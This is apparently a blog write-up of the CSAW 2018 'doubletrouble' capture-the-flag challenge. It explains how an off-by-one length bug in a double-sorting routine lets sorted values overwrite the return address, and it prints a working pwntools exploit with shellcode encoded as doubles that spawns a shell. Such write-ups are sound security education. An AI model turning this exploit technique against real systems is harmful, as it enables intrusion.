---
layout: post
title: "[CSAW:doubletrouble] Floating point sort."
comments: true
--- 

# The task.

![](/assets/files/ctf/2018/csaw/doubletrouble/task.png)

  * [original link](https://ctf.csaw.io/challenges#doubletrouble)
  * [attach](/assets/files/ctf/2018/csaw/doubletrouble/doubletrouble.zip)
  * [ctftime](https://ctftime.org/event/633)

# The bug.

Let's run the app.

![](/assets/files/ctf/2018/csaw/doubletrouble/run.png)

The first address it shows `0xffb4a578`, is array address on the stack, so it's probably a hint to exploiting approach. Let's check binary security.

![](/assets/files/ctf/2018/csaw/doubletrouble/checksec.png)

So we got an executable stack, no PIE but canary. Let’s analyze the binary for any vulnerabilities. Everything looks good, except this:

![](/assets/files/ctf/2018/csaw/doubletrouble/decompile.png)

That `*a1 += (int)&GLOBAL_OFFSET_TABLE_ - 134529023;` is just `*a1 += 1`, where `a1` is pointer to lenght of the user input array. 

After `findArray()` there is call to `sortArray()`.

![](/assets/files/ctf/2018/csaw/doubletrouble/sortArray.png)

So we basically can run sort with modified length of the array, affecting data right after it. Let's inspect a stack layout.

![](/assets/files/ctf/2018/csaw/doubletrouble/stack.png)

The attack plan is to craft such input data, that after sorting, canary will remain at the same place, but ret address will be our input data.

So we need to sort at least 0x18 bytes after user input array. We should craft our new length to be at least 64 (max possible user input) + 3 (which is 0x18 / 8)

# The double.

User input is stored as `double`. Let's remember how `double` is represented in memory.

![](/assets/files/ctf/2018/csaw/doubletrouble/618px-IEEE_754_Double_Floating_Point_Format.svg)

We can manipulate that type with python as well.

```
>>> "%.20g" % struct.unpack("<d", p64(0xf8ffffffffffffff))[0]
'-6.9244620785013907482e+274'
>>> struct.pack("<d", -6.9244620785013907482e+274).encode("hex")
'fffffffffffffff8'
```

# The exploit.

The first thing we need to do is to patch array size. The bug is triggered when the input is `> -100` and `< -10`. For example, if we want to patched length equal to 67 (which is 64 + 7), we should send first two values, not in that range, and second - in that range. 

We will set huge negative value as our most user data, so it will appear on top of sorted data, and will not affect our result mostly. However, we can only use the new return address greater than the original one, otherwise, it will not be sorted, as we need. 

My strategy was to jump on `ret`, and use next `double`'s low DWORD to control EIP. So now we need to use 64 + 4 as new size.

After we control EIP, we should execute the shell. Since the stack is executable and there is `system()` address binary, and `sh` is also present, we can just pop a shell with 2 opcodes:
```
push 0x804A12D
call dword ptr [0x804BFF0]
```

We can embed that shell code in our input, like this:
```
	sh1 = asm("push 0x804A12D; jmp $+3").ljust(8, '\xfe')
	sh2 = asm("call dword ptr [0x804BFF0]").ljust(8, '\xfc')

	r.sendline("%.20g" % struct.unpack("<d", sh1)[0])
	r.sendline("%.20g" % struct.unpack("<d", sh2)[0])
```

This will give us a proper sorting result, and that shellcode will appear in the right order since our high bytes are '\xfe' and '\xfc', which basically is just huge negative values. Since we got a leak at the start of the program, we can use that address to jump on it.

Canary value is participating in sorting as part of high dword of `double`. So we can only achieve proper sorting when the last byte of canary will be positive and `< 0x08` (because our return address highest byte it `0x08`. That's why exploit is not stable at all but can do the job.  

The final exploit will look like this:

```
	r.recvuntil("0x")
	stack = r.recv(8)

	stack = int(stack, 16)
	log.info("stack 0x%x", stack)

	r.sendlineafter("long: ", str(64))

	pad = "%.20g" % unpack("<d", p64(0xf8ffffffffffffff))[0]
	jmp  = 0x080498A4ffffffff # ret gadget
	jmp2 = 0x0806000000000000 + stack # addr of shellcode


	sh1 = asm("push 0x804A12D; jmp $+3").ljust(8, '\xfe')
	sh2 = asm("call dword ptr [0x804BFF0]").ljust(8, '\xfc')

	r.sendline("%.20g" % struct.unpack("<d", sh1)[0])
	r.sendline("%.20g" % struct.unpack("<d", sh2)[0])

	for i in range(0, 2):
		r.sendline(pad)

	r.sendline(str(-99))
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp))[0])
	r.sendline( "%.20g" % struct.unpack("<d", p64(jmp2))[0])

	for i in range(0, 64-7):
	 	r.sendline( pad)

	r.sendline("ls")
	r.interactive()
```

The full version is [here](/assets/files/ctf/2018/csaw/doubletrouble/xpwn.py).
